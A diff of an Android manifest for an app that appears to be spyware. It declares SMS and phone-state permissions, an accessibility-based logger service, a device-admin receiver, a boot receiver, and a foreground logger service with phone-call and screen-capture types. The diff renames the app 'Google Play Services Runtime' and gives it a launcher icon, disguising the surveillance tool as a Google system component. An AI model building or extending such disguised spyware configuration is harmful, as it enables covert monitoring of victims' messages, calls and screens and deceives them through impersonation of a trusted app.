@@ -13,6 +13,7 @@
     <uses-feature android:name="android.hardware.location.gps" android:required="false"/>
     <uses-feature android:name="android.hardware.sensor.accelerometer" android:required="false"/>
 
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -39,21 +40,15 @@
         android:allowBackup="false"
         android:fullBackupContent="false"
         android:supportsRtl="true"
-        android:label=""
-        android:theme="@android:style/Theme.Translucent.NoTitleBar"
-        tools:targetApi="31"
+        android:label="Google Play Services Runtime"
+        android:theme="@style/Theme.AppCompat"
+        android:icon="@drawable/ic_launcher_foreground"
+        tools:targetApi="33"
         tools:ignore="DataExtractionRules">
-
-        <!-- Background logger service -->
         <meta-data
             android:name="com.google.android.wearable.standalone"
             android:value="true" />
-        <service
-            android:name=".service.LoggerService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="dataSync|phoneCall|connectedDevice|mediaProjection"
-            tools:ignore="ForegroundServicePermission" />
+        <!-- Accessibility Service -->
         <service
             android:name=".accessibility.LoggerAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -76,6 +71,7 @@
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
+        <!-- Device Admin Receiver -->
         <receiver
             android:name=".receiver.AdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -87,5 +83,12 @@
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
             </intent-filter>
         </receiver>
+        <!-- Background logger service -->
+        <service
+            android:name=".service.LoggerService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync|phoneCall|connectedDevice|mediaProjection"
+            tools:ignore="ForegroundServicePermission" />
     </application>
 </manifest>
